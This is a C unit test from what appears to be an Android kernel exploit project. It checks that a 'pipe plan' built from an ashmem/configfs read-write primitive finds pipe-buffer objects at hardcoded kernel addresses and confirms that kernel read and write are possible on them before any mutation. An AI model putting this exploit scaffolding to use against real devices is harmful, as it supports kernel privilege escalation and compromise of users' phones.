#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>

#include "../src/08_ashmem_configfs_rw.h"
#include "../src/09_pipe_plan.h"

int main(void) {
  struct oss_pipe_plan plan;
  uint64_t known_base = 0;
  uint64_t payload_base = 0xffffff8a41f48000ULL;
  uint64_t proof_addr = payload_base + TARGET_PIPE_PROOF_LIVE_OFF;
  assert(oss_kernel_write_plan_supported(proof_addr, 0x17));
  assert(oss_kernel_write_plan_supported(proof_addr, sizeof(uint64_t)));
  for (uint64_t candidate = 0xffffff8a30000000ULL;
       candidate < 0xffffff8a40000000ULL; candidate += TARGET_ORDER3_SIZE) {
    if (oss_pipe_plan_build(candidate, payload_base, &plan)) {
      known_base = candidate;
      break;
    }
  }
  assert(known_base != 0);
  assert(plan.ready);
  assert(plan.known_order3_base == known_base);
  assert(plan.candidate_count > 0);
  assert(plan.candidate_count <= OSS_PIPE_PLAN_MAX_CANDIDATES);
  for (size_t i = 0; i < plan.candidate_count; i++) {
    assert((plan.candidates[i] - known_base) % TARGET_PIPE_OBJECT_SIZE == 0);
    assert(oss_pipe_plan_contains(&plan, plan.candidates[i]));
    assert(oss_kernel_read_plan_supported(plan.candidates[i],
                                          TARGET_PIPE_BUFFER_STRIDE));
    assert(oss_kernel_write_plan_supported(plan.candidates[i],
                                           TARGET_PIPE_BUFFER_STRIDE));
  }

  errno = 0;
  assert(!oss_pipe_plan_build(known_base + 1, payload_base, &plan));
  assert(!plan.ready);
  puts("PASS deterministic pipe plan is complete before mutation");
  return 0;
}
